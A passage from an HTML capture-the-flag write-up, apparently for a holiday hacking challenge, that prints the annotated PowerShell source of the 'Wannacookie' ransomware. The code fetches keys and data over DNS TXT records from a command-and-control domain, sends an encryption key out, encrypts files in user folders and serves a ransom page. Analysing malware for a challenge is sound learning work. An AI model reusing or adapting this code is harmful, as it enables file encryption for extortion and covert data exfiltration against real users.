    $file++) { while ($true) { $running = @(Get-Job | Where-Object { $_.State -eq 'Running' });
      if ($running.count -le $tcount) { Start-Job -ScriptBlock { param($key,$File,$true_false);
          try { e_d_file $key $File $true_false } catch { $_.Exception.Message | Out-String | Out-File $($env:userprofile + '\Desktop\ps_log.txt') -Append } } -args $key,$allfiles[$file],$make_cookie -InitializationScript $functions;
        break } else { Start-Sleep -m 200;
        continue } } } };</span>
<span data-toggle="tooltip" title="Get over DNS">function g_o_dns ($f) { $h = '';
  foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings,10) - 1)) { $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings };
  return (H2A $h) };</span>
<span data-toggle="tooltip" title="Split into chunks">function s_2_c ($astring,$size = 32) { $new_arr = @();
  $chunk_index = 0;
  foreach ($i in 1..$($astring.Length / $size)) { $new_arr += @($astring.substring($chunk_index,$size));
    $chunk_index += $size };
  return $new_arr };</span>
<span data-toggle="tooltip" title="Send key to C2">function snd_k ($enc_k) { $chunks = (s_2_c $enc_k);
  foreach ($j in $chunks) { if ($chunks.IndexOf($j) -eq 0) { $n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings } else { $(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings } };
  return $n_c_id };</span>
<span data-toggle="tooltip" title="Wannacookie!">function wanc {
  $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
  if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) { return };
  if ($(netstat -ano | Select-String "127.0.0.1:8080").Length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") { return };
  $p_k = [System.Convert]::FromBase64String($(g_o_dns ("7365727665722E637274")));
  $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort { Get-Random })[0..15] -join '')) | Where-Object { $_ -ne 0x00 });
  $h_k = $(B2H $b_k);
  $k_h = $(sh1 $h_k);
  $p_k_e_k = (p_k_e $b_k $p_k).ToString();
  $c_id = (snd_k $p_k_e_k);
  $d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n");
  [array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile + '\Desktop'),$($env:userprofile + '\Documents'),$($env:userprofile + '\Videos'),$($env:userprofile + '\Pictures'),$($env:userprofile + '\Music')) -Recurse | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName });
  e_n_d $b_k $f_c $true;
  Clear-Variable -Name "h_k";
  Clear-Variable -Name "b_k";
  $lurl = 'http://127.0.0.1:8080/';
  $html_c = @{ 'GET /' = $(g_o_dns (A2H "source.min.html"));
    'GET /close' = '&lt;p&gt;Bye!&lt;/p&gt;' };
  Start-Job -ScriptBlock { param($url);
    Start-Sleep 10;
    Add-Type -AssemblyName System.Windows.Forms;
    Start-Process "$url" -WindowStyle Maximized;
    Start-Sleep 2;
    [System.Windows.Forms.SendKeys]::SendWait("{F11}") } -Arg $lurl;
  $list = New-Object System.Net.HttpListener;
  $list.Prefixes.Add($lurl);
  $list.Start();
  try { $close = $false;
    while ($list.IsListening) { $context = $list.GetContext();
      $Req = $context.Request;
      $Resp = $context.Response;
      $recvd = '{0} {1}' -f $Req.httpmethod,$Req.url.localpath;
      if ($recvd -eq 'GET /') { $html = $html_c[$recvd] } elseif ($recvd -eq 'GET /decrypt') { $akey = $Req.QueryString.Item("key");
        if ($k_h -eq $(sh1 $akey)) { $akey = $(H2B $akey);
          [array]$f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse -Filter *.wannacookie | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName });
          e_n_d $akey $f_c $false;
          $html = "Files have been decrypted!";
          $close = $true } else { $html = "Invalid Key!" } } elseif ($recvd -eq 'GET /close') { $close = $true;
        $html = $html_c[$recvd] } elseif ($recvd -eq 'GET /cookie_is_paid') { $c_n_k = $(Resolve-DnsName -Server erohetfanu.com -Name ("$c_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings;
        if ($c_n_k.Length -eq 32) { $html = $c_n_k } else { $html = "UNPAID|$c_id|$d_t" } } else { $Resp.statuscode = 404;
        $html = '&lt;h1&gt;404 Not Found&lt;/h1&gt;' };
      $buffer = [Text.Encoding]::UTF8.GetBytes($html);
      $Resp.ContentLength64 = $buffer.Length;
      $Resp.OutputStream.Write($buffer,0,$buffer.Length);
      $Resp.Close();
      if ($close) { $list.Stop();
        return } } } finally { $list.Stop() } };</span>
wanc;</pre>
      </div>
      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="artWannacookieHTML"></a>Wannacookie Source HTML Code
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#obj93">Objective 9.3</a>
          </div>
        </div>
        <p>Using the g_o_dns function we can also download source.html and source.min.html. They are included here for your personal analysis.</p>
        <a class="btn btn-info" href="artefacts/source.min.html" target="_blank">source.min.html</a>
        <a class="btn btn-info" href="artefacts/source.html" target="_blank">source.html</a>
      </div>
    </div>

    <script src="js/jquery-3.2.1.slim.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
  </body>
</html>
